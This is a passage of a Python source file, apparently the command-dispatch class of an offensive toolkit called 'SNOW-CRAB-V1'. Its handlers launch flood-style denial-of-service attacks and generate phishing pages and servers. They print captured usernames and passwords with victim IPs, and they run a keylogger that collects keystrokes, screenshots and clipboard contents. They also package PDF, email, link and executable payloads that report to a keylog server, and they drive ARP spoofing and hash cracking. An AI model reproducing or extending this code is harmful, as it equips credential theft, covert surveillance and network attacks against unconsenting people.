        return self._dos_syn(args)
    
    def _dos_udp_flood(self, args: List[str]) -> Dict:
        """UDP flood (alias)"""
        return self._dos_udp(args)
    
    def _dos_http_flood(self, args: List[str]) -> Dict:
        """HTTP flood (alias)"""
        return self._dos_http(args)
    
    def _dos_icmp_flood(self, args: List[str]) -> Dict:
        """ICMP flood (alias)"""
        return self._dos_icmp(args)
    
    # ==================== PHISHING COMMAND IMPLEMENTATIONS ====================
    def _phish(self, platform: str) -> Dict:
        """Generate phishing link"""
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        """Start phishing server"""
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            url = self.social.phishing_server.get_url()
            return {'success': True, 'output': f"🎣 Phishing server started on {url}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        """Stop phishing server"""
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        """Get captured credentials"""
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _list_templates(self, args: List[str]) -> Dict:
        """List phishing templates"""
        templates = self.social.get_available_templates()
        if not templates:
            return {'success': True, 'output': 'No templates found'}
        output = "🎣 Available Phishing Templates:\n"
        for t in templates:
            output += f"  • {t}\n"
        return {'success': True, 'output': output}
    
    def _view_template(self, args: List[str]) -> Dict:
        """View a phishing template"""
        if not args:
            return {'success': False, 'output': 'Usage: view_template <name>'}
        name = args[0]
        template = self.db.get_phishing_template(name)
        if not template:
            return {'success': False, 'output': f"Template '{name}' not found"}
        output = f"📄 Template: {name}\n"
        output += f"Category: {template.get('category', 'unknown')}\n"
        output += f"Updated: {template.get('updated_at', 'unknown')}\n"
        output += f"\n{template.get('html_content', '')[:2000]}"
        return {'success': True, 'output': output}
    
    def _edit_template(self, args: List[str]) -> Dict:
        """Edit a phishing template"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: edit_template <name> <html_file>'}
        name = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            
            if self.social.update_template(name, html_content):
                return {'success': True, 'output': f"Template '{name}' updated successfully"}
            return {'success': False, 'output': f"Failed to update template '{name}'"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _create_template(self, args: List[str]) -> Dict:
        """Create a custom phishing template"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: create_template <name> <html_file>'}
        name = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            
            if self.social.create_custom_template(name, html_content):
                return {'success': True, 'output': f"Custom template '{name}' created successfully"}
            return {'success': False, 'output': f"Failed to create template '{name}'"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _delete_template(self, args: List[str]) -> Dict:
        """Delete a phishing template"""
        if not args:
            return {'success': False, 'output': 'Usage: delete_template <name>'}
        name = args[0]
        
        if self.social.delete_template(name):
            return {'success': True, 'output': f"Template '{name}' deleted successfully"}
        return {'success': False, 'output': f"Failed to delete template '{name}'"}
    
    # ==================== KEYLOGGER COMMAND IMPLEMENTATIONS ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        """Start keylogger"""
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        """Stop keylogger"""
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        """Get keylogger status"""
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        """Get keylogger logs"""
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        """Get keylogger screenshots"""
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        """Get clipboard history"""
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== DEPLOYMENT COMMAND IMPLEMENTATIONS ====================
    def _deploy_pdf(self, args: List[str]) -> Dict:
        """Create PDF deployment"""
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_pdf <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_pdf_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"PDF deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_email(self, args: List[str]) -> Dict:
        """Create email deployment"""
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: deploy_email <name> <target> <subject> <body> <keylog_url>'}
        name = args[0]
        target = args[1]
        subject = args[2]
        body = args[3]
        keylog_url = args[4]
        deployment = self.deployment.create_email_payload(name, target, subject, body, keylog_url)
        return {
            'success': True,
            'output': f"Email deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_link(self, args: List[str]) -> Dict:
        """Create link deployment"""
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_link <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_link_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"Link deployment created: {deployment.id}\nURL: {deployment.payload}",
            'data': {'id': deployment.id, 'url': deployment.payload}
        }
    
    def _deploy_executable(self, args: List[str]) -> Dict:
        """Create executable deployment"""
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_executable <name> <target> <keylog_server>'}
        name = args[0]
        target = args[1]
        keylog_server = args[2]
        deployment = self.deployment.create_executable_payload(name, target, keylog_server)
        return {
            'success': True,
            'output': f"Executable deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_list(self, args: List[str]) -> Dict:
        """List deployments"""
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        deployments = self.deployment.get_deployments()
        if not deployments:
            return {'success': True, 'output': 'No deployments found'}
        output = "Deployments:\n"
        for d in deployments:
            status = "📄" if d['delivered'] else "⏳"
            output += f"  {status} {d['id']} - {d['name']} ({d['type']})\n"
            output += f"     Target: {d['target']}\n"
            output += f"     Opened: {d['opened']}, Executed: {d['executed']}\n"
        return {'success': True, 'output': output}
    
    def _deploy_track(self, args: List[str]) -> Dict:
        """Track deployment open"""
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: deploy_track <deployment_id>'}
        deployment_id = args[0]
        self.deployment.track_opened(deployment_id)
        return {'success': True, 'output': f"Tracked open for deployment {deployment_id}"}
    
    # ==================== ARP SPOOFING COMMAND IMPLEMENTATIONS ====================
    def _arp_spoof(self, args: List[str]) -> Dict:
        """Start ARP spoofing"""
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <gateway_ip> [interface]'}
        target_ip = args[0]
        gateway_ip = args[1]
        interface = args[2] if len(args) > 2 else None
        
        result = self.arp_spoofing.start_spoof(target_ip, gateway_ip, interface)
        if result.status == "running":
            return {'success': True, 'output': f"🕸️ ARP spoofing started\nTarget: {target_ip}\nGateway: {gateway_ip}\nInterface: {result.interface}"}
        return {'success': False, 'output': f"Failed to start ARP spoofing"}
    
    def _arp_stop(self, args: List[str]) -> Dict:
        """Stop ARP spoofing"""
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        spoof_id = args[0] if args else None
        if self.arp_spoofing.stop_spoof(spoof_id):
            return {'success': True, 'output': 'ARP spoofing stopped' + (f' ({spoof_id})' if spoof_id else '')}
        return {'success': False, 'output': 'Failed to stop ARP spoofing'}
    
    def _arp_status(self, args: List[str]) -> Dict:
        """Get ARP spoofing status"""
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        active = self.arp_spoofing.get_active_spoofs()
        if not active:
            return {'success': True, 'output': 'No active ARP spoofing'}
        output = "🕸️ Active ARP Spoofs:\n"
        for s in active:
            output += f"  • {s['target_ip']} -> {s['gateway_ip']} ({s['interface']}) - {s['status']}\n"
        return {'success': True, 'output': output}
    
    def _arp_history(self, args: List[str]) -> Dict:
        """Get ARP spoofing history"""
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        limit = int(args[0]) if args else 20
        history = self.arp_spoofing.get_spoof_history(limit)
        if not history:
            return {'success': True, 'output': 'No ARP spoofing history'}
        output = "📋 ARP Spoofing History:\n"
        for h in history:
            output += f"  • {h['target_ip']} -> {h['gateway_ip']} - {h['status']} ({h['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== MAC COMMAND IMPLEMENTATIONS ====================
    def _mac_info(self, args: List[str]) -> Dict:
        """Get MAC address info"""
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: mac_info <mac_address>'}
        mac = args[0]
        info = self.mac_manager.get_mac_info(mac)
        output = f"📡 MAC Information:\n"
        output += f"  MAC Address: {info.get('mac_address', 'Unknown')}\n"
        output += f"  Vendor: {info.get('vendor', 'Unknown')}\n"
        output += f"  IP Address: {info.get('ip_address', 'Unknown')}\n"
        output += f"  Hostname: {info.get('hostname', 'Unknown')}\n"
        output += f"  First Seen: {info.get('first_seen', 'Unknown')}\n"
        output += f"  Last Seen: {info.get('last_seen', 'Unknown')}"
        return {'success': True, 'output': output}
    
    def _mac_scan(self, args: List[str]) -> Dict:
        """Scan network for MAC addresses"""
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        network = args[0] if args else None
        results = self.mac_manager.scan_network(network)
        if not results:
            return {'success': True, 'output': 'No devices found'}
        output = "📡 Network MAC Scan Results:\n"
        for r in results:
            output += f"  • {r['ip_address']} - {r['mac_address']} ({r['vendor']})\n"
        return {'success': True, 'output': output}
    
    def _mac_vendor(self, args: List[str]) -> Dict:
        """Get MAC vendor"""
        if not args:
            return {'success': False, 'output': 'Usage: mac_vendor <mac_address>'}
        mac = args[0]
        vendor = NetworkTools.get_mac_vendor(mac)
        if vendor:
            return {'success': True, 'output': f"Vendor for {mac}: {vendor}"}
        return {'success': False, 'output': f"Could not determine vendor for {mac}"}
    
    def _mac_all(self, args: List[str]) -> Dict:
        """Get all MAC addresses"""
        macs = self.db.get_all_mac_info()
        if not macs:
            return {'success': True, 'output': 'No MAC addresses in database'}
        output = "📡 All MAC Addresses:\n"
        for m in macs:
            output += f"  • {m['mac_address']} - {m['vendor']} - {m['ip_address']}\n"
        return {'success': True, 'output': output}
    
    # ==================== NAT COMMAND IMPLEMENTATIONS ====================
    def _nat_info(self, args: List[str]) -> Dict:
        """Get NAT information"""
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        output = f"🌐 NAT Information:\n"
        output += f"  Public IP: {info.public_ip}\n"
        output += f"  Private IP: {info.private_ip}\n"
        output += f"  Router IP: {info.router_ip}\n"
        output += f"  Country: {info.country}\n"
        output += f"  ISP: {info.isp}\n"
        output += f"  NAT Type: {info.nat_type}"
        return {'success': True, 'output': output}
    
    def _nat_public(self, args: List[str]) -> Dict:
        """Get public IP"""
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Public IP: {info.public_ip}"}
    
    def _nat_private(self, args: List[str]) -> Dict:
        """Get private IP"""
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Private IP: {info.private_ip}"}
    
    def _nat_history(self, args: List[str]) -> Dict:
        """Get NAT history"""
        limit = int(args[0]) if args else 10
        history = self.db.get_nat_info(limit)
        if not history:
            return {'success': True, 'output': 'No NAT history'}
        output = "🌐 NAT History:\n"
        for h in history:
            output += f"  • {h['timestamp'][:19]} - Public: {h['public_ip']}, Private: {h['private_ip']}\n"
        return {'success': True, 'output': output}
    
    # ==================== DOMAIN HOSTING COMMAND IMPLEMENTATIONS ====================
    def _ip_to_domain(self, args: List[str]) -> Dict:
        """Translate IP to domain"""
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        ip = args[0]
        try:
            domain = self.domain_hosting.translate_ip_to_domain(ip)
            if domain:
                return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
            return {'success': False, 'output': f"No domain found for IP {ip}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        """Translate domain to IP"""
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        domain = args[0]
        try:
            ip = self.domain_hosting.translate_domain_to_ip(domain)
            if ip:
                return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
            return {'success': False, 'output': f"No IP found for domain {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _host_domain(self, args: List[str]) -> Dict:
        """Host a domain"""
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        ip = args[0]
        domain = args[1]
        port = int(args[2]) if len(args) > 2 else 8080
        
        try:
            domain_host = self.domain_hosting.host_domain(ip, domain, port)
            if domain_host:
                return {
                    'success': True,
                    'output': f"Domain {domain} hosted on IP {ip}:{port}\nID: {domain_host.id}\nPath: {domain_host.hosting_path}"
                }
            return {'success': False, 'output': f"Failed to host domain {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _host_website(self, args: List[str]) -> Dict:
        """Host a website"""
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_website <domain> <html_file>'}
        domain = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            success = self.domain_hosting.host_website(domain, html_content)
            if success:
                return {'success': True, 'output': f"Website hosted on http://{domain}"}
            return {'success': False, 'output': f"Failed to host website on {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _list_domains(self, args: List[str]) -> Dict:
        """List hosted domains"""
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        try:
            domains = self.domain_hosting.list_hosted_domains()
            if not domains:
                return {'success': True, 'output': 'No hosted domains'}
            output = "Hosted Domains:\n"
            for d in domains:
                status = "🟢 Active" if d['active'] else "🔴 Inactive"
                output += f"  • {d['domain']} -> {d['ip']} ({status})\n"
            return {'success': True, 'output': output}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _domain_info(self, args: List[str]) -> Dict:
        """Get domain info"""
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_info <domain>'}
        domain = args[0]
        try:
            domains = self.domain_hosting.list_hosted_domains()
            for d in domains:
                if d['domain'] == domain:
                    return {'success': True, 'output': json.dumps(d, indent=2)}
            return {'success': False, 'output': f"Domain {domain} not found"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    # ==================== CRACKING COMMAND IMPLEMENTATIONS ====================
    def _crack(self, args: List[str]) -> Dict:
        """Start hash cracking"""
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        hash_type = args[0]
        hash_value = args[1]
        wordlist = args[2] if len(args) > 2 else None
        
        job_id = self.cracking.crack_hash(hash_type, hash_value, wordlist)
        return {
            'success': True,
            'output': f"🔓 Cracking job started: {job_id}\nHash type: {hash_type}\nHash: {hash_value[:20]}...\nUse 'crack_status {job_id}' to check progress"
        }
    
    def _crack_status(self, args: List[str]) -> Dict:
        """Get cracking job status"""
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job_id = args[0]
        job = self.cracking.get_job_status(job_id)
        if not job:
            return {'success': False, 'output': f'Job {job_id} not found'}
        
        output = f"🔓 Cracking Job Status: {job_id}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        if job.get('cracked'):
            output += "  ✅ Cracked!\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        """List cracking jobs"""
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        jobs = self.cracking.get_all_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    # ==================== DOCKER COMMAND IMPLEMENTATIONS ====================
    def _docker_scan(self, args: List[str]) -> Dict:
        """Scan Docker image"""
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        image = args[0]
        result = self.docker_scanner.scan_image(image)
        if result['success']:
            output = f"🐳 Docker scan of {image} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            for v in result.get('vulnerabilities', [])[:5]:
                output += f"  • {v.get('description', '')[:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        """Get Docker info"""
        result = self.docker_scanner.docker_info()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_ps(self, args: List[str]) -> Dict:
        """List Docker containers"""
        result = self.docker_scanner.docker_ps()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_images(self, args: List[str]) -> Dict:
        """List Docker images"""
        result = self.docker_scanner.docker_images()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_bench(self, args: List[str]) -> Dict:
        """Run Docker Bench Security"""
        result = self.docker_scanner.docker_bench()
        return {'success': result['success'], 'output': result['output']}
    
    # ==================== EMAIL COMMAND IMPLEMENTATIONS ====================
    def _email_compose(self, args: List[str]) -> Dict:
        """Compose an email"""
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: email_compose <to> <subject> <body> [html]'}
        to = args[0]
        subject = args[1]
        body = ' '.join(args[2:]) if len(args) > 2 else ''
        html = len(args) > 3 and args[3].lower() == 'html'
        
        email_msg = self.email_composer.compose_email(to, subject, body, html=html)
        return {
            'success': True,
            'output': f"📧 Email composed\nTo: {to}\nSubject: {subject}\nUse 'email_list' to see draft, then 'email_send <id>' to send"
        }
    
    def _email_send(self, args: List[str]) -> Dict:
        """Send an email"""
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: email_send <email_id>'}
        email_id = int(args[0])
        result = self.email_composer.send_email(email_id)
        if result['success']:
            return {'success': True, 'output': f"📧 Email sent successfully: {result['message']}"}
        return {'success': False, 'output': f"Failed to send email: {result.get('error', 'Unknown error')}"}
    
    def _email_list(self, args: List[str]) -> Dict:
        """List emails"""
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        status = args[0] if args and args[0] in ['draft', 'sent', 'failed'] else None
        emails = self.email_composer.get_emails(status, 20)
        if not emails:
            return {'success': True, 'output': 'No emails found'}
        output = "📧 Emails:\n"
        for e in emails:
            output += f"  • ID: {e['id']} - To: {e['to_address']} - Subject: {e['subject'][:30]} - Status: {e['status']}\n"
        return {'success': True, 'output': output}
    
    def _email_delete(self, args: List[str]) -> Dict:
        """Delete an email"""
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: email_delete <email_id>'}
        email_id = int(args[0])
        if self.email_composer.delete_email(email_id):
            return {'success': True, 'output': f"Email {email_id} deleted"}
        return {'success': False, 'output': f"Failed to delete email {email_id}"}
    
    # ==================== PDF REPORT COMMAND IMPLEMENTATIONS ====================
    def _report_generate(self, args: List[str]) -> Dict:
        """Generate PDF report"""
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: report_generate <title> <target>'}
        title = args[0]
        target = args[1]
        
        analysis = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'scan_results': {},
            'recommendations': ['Review open ports', 'Check for vulnerabilities']
        }
        
        result = self.pdf_report.generate_report(title, target, analysis)
        if result['success']:
            return {'success': True, 'output': f"📊 PDF Report generated: {result['file_path']}"}
        return {'success': False, 'output': f"Failed to generate report: {result.get('error', 'Unknown error')}"}
    
    def _report_list(self, args: List[str]) -> Dict:
        """List PDF reports"""
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        reports = self.pdf_report.get_reports(20)
        if not reports:
            return {'success': True, 'output': 'No reports found'}
        output = "📊 PDF Reports:\n"
        for r in reports:
            output += f"  • {r['title']} - {r['target']} - {r['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    # ==================== NETWORK MONITOR COMMAND IMPLEMENTATIONS ====================
    def _netmon_start(self, args: List[str]) -> Dict:
        """Start network monitoring"""
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.start()
        return {'success': True, 'output': 'Network monitor started'}
    
    def _netmon_stop(self, args: List[str]) -> Dict:
        """Stop network monitoring"""
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.stop()
        return {'success': True, 'output': 'Network monitor stopped'}
    
    def _netmon_status(self, args: List[str]) -> Dict:
        """Get network monitoring status"""
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = f"Network Monitor Status:\n"
        output += f"  Running: {self.network_monitor.running}\n"
        output += f"  Interface: {self.network_monitor.interface}\n"
        output += f"  Promiscuous: {self.network_monitor.promiscuous}\n"
        output += f"  Packets captured: {self.network_monitor.packet_count}\n"
        output += f"\nTraffic Statistics:\n"
        for proto, count in stats.get('protocols', {}).items():
            output += f"  {proto}: {count}\n"
        return {'success': True, 'output': output}
    
    def _netmon_packets(self, args: List[str]) -> Dict:
        """Get captured packets"""
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        limit = int(args[0]) if args else 20
        packets = self.network_monitor.get_packets(limit)
        if not packets:
            return {'success': True, 'output': 'No packets captured'}
        output = f"Recent Packets ({len(packets)}):\n"
        for p in packets:
            output += f"  {p.get('timestamp', '')[:19]} {p.get('source_ip', '')} -> {p.get('dest_ip', '')} ({p.get('protocol', 'unknown')})\n"
        return {'success': True, 'output': output}
    
    # ==================== IP MANAGEMENT COMMAND IMPLEMENTATIONS ====================
    def _add_ip(self, args: List[str]) -> Dict:
        """Add IP to monitoring"""
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        
        domain = NetworkTools.reverse_dns(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        """Remove IP from monitoring"""
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        if self.db.remove_managed_ip(ip):
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        """Block an IP"""
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        if self.db.block_ip(ip, reason, 'cli'):
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        """Unblock an IP"""
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        if self.db.unblock_ip(ip):
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        """List managed IPs"""
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        """Get IP information"""
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = NetworkTools.get_geolocation(ip)
            domain = NetworkTools.reverse_dns(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        """Complete IP analysis"""
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = NetworkTools.ping(ip, 4)
        location = NetworkTools.get_geolocation(ip)
        nmap_result = NetworkTools.nmap_scan(ip, 'quick')
        domain = NetworkTools.reverse_dns(ip)
        
        output = f"❄️ SNOW-CRAB-V1 IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
